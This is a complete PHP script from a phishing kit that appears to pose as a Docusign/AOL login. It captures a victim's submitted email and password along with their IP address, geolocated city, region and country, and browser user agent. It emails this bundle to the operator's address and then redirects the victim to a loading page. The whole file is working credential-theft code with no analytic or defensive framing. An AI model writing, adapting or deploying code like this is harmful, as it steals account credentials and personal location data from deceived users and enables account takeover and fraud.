<?php

if($_POST['password'] !=""){

$time = date("D/M/d, Y g:i a"); 
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('./mail.php');
require_once('./geoip.php');
$geoplugin = new geoPlugin();

$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}
	
	$message .= "[+]=====================| Login Info |========================[+]\n";
    $message .= "Email : " . $_POST['email'] . "\n"; 
    $message .= "Password : " . $_POST['password'] . "\n";  
    $message .= "[+]=====================| Geo Ip |========================[+]\n";
    $message .= "IP : " .$ip. "\n";
    $message .= "City : {$geoplugin->city}\n";
    $message .= "Region : {$geoplugin->region}\n";
    $message .= "Country Name : {$geoplugin->countryName}\n";
    $message .= "Country Code : {$geoplugin->countryCode}\n";
    $message .= "[+]=====================| User Agent Browser |========================[+]\n";
    $message .= "User Agent : ".$browser."\n";
    $message .= "[+]=====================| $time |========================[+]\n";
		
	$subject=" Docusign AOL {$geoplugin->countryCode} $ip";
	
	mail($mymail, $subject, $message);
	
?>

<script type="text/javascript"> 
<!-- 
   window.location="loading.html"; 

</script> 

<?PHP

}

?>